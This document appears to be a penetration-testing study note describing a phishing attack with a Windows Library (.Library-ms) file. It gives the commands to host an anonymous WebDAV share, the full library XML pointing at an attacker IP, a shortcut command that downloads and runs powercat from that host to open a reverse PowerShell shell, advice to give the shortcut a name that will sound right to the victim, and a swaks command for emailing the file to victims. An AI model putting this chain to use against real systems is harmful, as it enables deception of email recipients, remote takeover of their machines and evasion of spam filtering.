Windows Library files (`.Library-ms`) connect users with data stored in remote locations (web services or shares).

### Example
Create a Windows library file connecting to a WebDAV share. In the webDAV directory, we will put a payload in the form of a `.lnk` file. We use the webDAV directory rather than our own web server to avoid spam filters. 

Steps:
1. Create the webdav directory
	1.`mkdir /home/kali/webdav`
	2. `touch /home/kali/webdav/test.txt`
	3. `/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav`
2. Prepare the `config.Library-ms` file
	1. Open VS Code
	2. File > New Text File
	3. Example code:
	   
	<?xml version="1.0" encoding="UTF-8"?>
	<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
	<name>@windows.storage.dll,-34582</name>
	<version>6</version>
	<isLibraryPinned>true</isLibraryPinned>
	<iconReference>imageres.dll,-1003</iconReference>
	<templateInfo>
	<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
	</templateInfo>
	<searchConnectorDescriptionList>
	<searchConnectorDescription>
	<isDefaultSaveLocation>true</isDefaultSaveLocation>
	<isSupported>false</isSupported>
	<simpleLocation>
	<url>http://**$kaliIP**</url>
	</simpleLocation>
	</searchConnectorDescription>
	</searchConnectorDescriptionList>
	</libraryDescription>

	4. When they click this code, it will open the webDAV directory and show whichever files we placed in `/home/kali/webDAV`. So we need to add a `.lnk` file there. 
	5. Right click on Windows desktop and click New > Shortcut. 
	6. Sample command: `powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://$kaliIP/powercat.ps1'); powercat -c $kaliIP -p 4444 -e powershell"`
		1. For this command to work, we also need to be serving powercat from port 80 and running a reverse listener on port 4444. 
	7. Click next. Save it as what will sound right to the victim. 
	8. Send the victim the `config.Library-ms` file, they will open it, and then hopefully execute the `.lnk` file. 
	9. Swaks example: `sudo swaks -t victim@domain.com -t victim2@domain.com --from attacker@domain.com --attach @config.Library-ms --server $mailServerIP --body @body.txt --header "Subject: Example Email" --suppress-data -ap`
		1. Where `-t` = to, `suppress-data` means to summarize info regarding SMTP transactions, and `-ap` enables password authentication
